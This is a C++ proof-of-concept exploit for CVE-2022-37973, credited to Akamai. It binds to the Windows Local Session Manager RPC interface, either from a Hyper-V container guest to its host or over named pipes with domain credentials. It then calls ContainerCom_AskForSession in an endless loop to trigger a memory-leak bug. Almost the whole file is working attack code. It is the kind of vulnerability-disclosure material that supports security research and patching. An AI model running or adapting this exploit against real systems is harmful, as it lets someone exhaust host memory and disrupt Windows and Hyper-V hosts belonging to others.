/* CVE-2022-37973 PoC code
 * Copyright 2022 Akamai Technologies, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in
 * compliance with the License.  You may obtain a copy
 * of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in
 * writing, software distributed under the License is
 * distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
 * CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing
 * permissions and limitations under the License.
 */

#include <iostream>
#include "lsm_h.h"
const int IS_REMOTE_ATTACK = false;
#pragma comment(lib, "RpcRT4.lib")

int main()
{
    RPC_STATUS rpcStatus;
    handle_t hExplicitBinding = NULL;
    RPC_WSTR szStringBinding = NULL;
    RPC_WSTR pszProtSeq;
    RPC_WSTR pszHost;
    RPC_WSTR pszPort;

    if (IS_REMOTE_ATTACK)
    {
        /* Network attack. This would work only if we have a valid user credentials for IPC$, for example by having a domain user in a domain environment */
        pszProtSeq = (RPC_WSTR)L"ncacn_np";
        pszHost = (RPC_WSTR)L"IP ADDRESS";
        pszPort = (RPC_WSTR)L"\\pipe\\LSM_API_service";
    }
    else 
    {
        /* HYPER-V Container Guest to Host */
        pszProtSeq = (RPC_WSTR)L"ncacn_hvsocket";
        pszHost = (RPC_WSTR)L"parent";
        pszPort = (RPC_WSTR)L"F58797F6-C9F3-4D63-9BD4-E52AC020E586";
    }
    

    rpcStatus = RpcStringBindingComposeW(0, pszProtSeq, pszHost, pszPort, 0 , &szStringBinding);
    if (rpcStatus != RPC_S_OK) {
        wprintf(L"[-] Failed with status: %d.\n", rpcStatus);
        exit(rpcStatus);
    }

    rpcStatus = RpcBindingFromStringBinding(szStringBinding, &hExplicitBinding);

    /* Memory leak bug */
    while (true)
    {
        wprintf(L"ContainerCom_AskForSession: %d\n", ContainerCom_AskForSession(hExplicitBinding));
    }
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}